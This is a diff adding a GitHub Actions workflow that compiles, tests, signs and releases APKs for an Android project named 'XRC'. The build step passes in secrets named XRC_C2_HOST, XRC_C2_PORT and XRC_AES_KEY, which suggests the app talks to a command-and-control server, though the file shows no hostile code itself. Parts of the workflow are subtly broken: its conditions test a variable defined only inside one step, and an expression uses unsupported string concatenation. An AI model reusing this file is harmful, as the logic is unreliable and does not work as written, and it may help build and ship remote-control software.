@@ -1,0 +1,82 @@
+name: XRC Build Pipeline
+
+on:
+  push:
+    branches: [ main ]
+    tags: [ 'v*' ]
+  pull_request:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'XRC version'
+        required: false
+        default: '1.0.0'
+
+permissions:
+  contents: write
+
+env:
+  GRADLE_VERSION: '9.5.0'
+
+jobs:
+  build:
+    name: Compile · Test · Sign · Package
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install Gradle ${{ env.GRADLE_VERSION }}
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: ${{ env.GRADLE_VERSION }}
+          cache-read-only: ${{ github.ref != 'refs/heads/main' }}
+
+      - name: Inject release keystore (only if secrets configured)
+        if: env.XRC_KEYSTORE_B64 != ''
+        env:
+          XRC_KEYSTORE_B64: ${{ secrets.XRC_KEYSTORE_B64 }}
+        run: echo "$XRC_KEYSTORE_B64" | base64 -d > "$RUNNER_TEMP/xrc-release.keystore"
+
+      - name: Build debug + release APKs + unit tests
+        working-directory: android
+        env:
+          XRC_STORE_FILE: ${{ secrets.XRC_KEYSTORE_B64 != '' && runner.temp + '/xrc-release.keystore' || '' }}
+          XRC_STORE_PASS: ${{ secrets.XRC_KEYSTORE_PASS }}
+          XRC_KEY_ALIAS: ${{ secrets.XRC_KEY_ALIAS }}
+          XRC_KEY_PASS: ${{ secrets.XRC_KEY_PASS }}
+          XRC_C2_HOST: ${{ secrets.XRC_C2_HOST }}
+          XRC_C2_PORT: ${{ secrets.XRC_C2_PORT }}
+          XRC_AES_KEY: ${{ secrets.XRC_AES_KEY }}
+        run: |
+          gradle assembleDebug assembleRelease testDebugUnitTest --no-daemon --stacktrace
+
+      - name: Upload debug APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: XRC-debug
+          path: android/app/build/outputs/apk/debug/*.apk
+          if-no-files-found: error
+
+      - name: Upload release APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: XRC-release
+          path: android/app/build/outputs/apk/release/*.apk
+          if-no-files-found: error
+
+      - name: Publish GitHub Release
+        if: startsWith(github.ref, 'refs/tags/') && env.XRC_KEYSTORE_B64 != ''
+        uses: softprops/action-gh-release@v2
+        with:
+          files: android/app/build/outputs/apk/release/*.apk
+          generate_release_notes: true
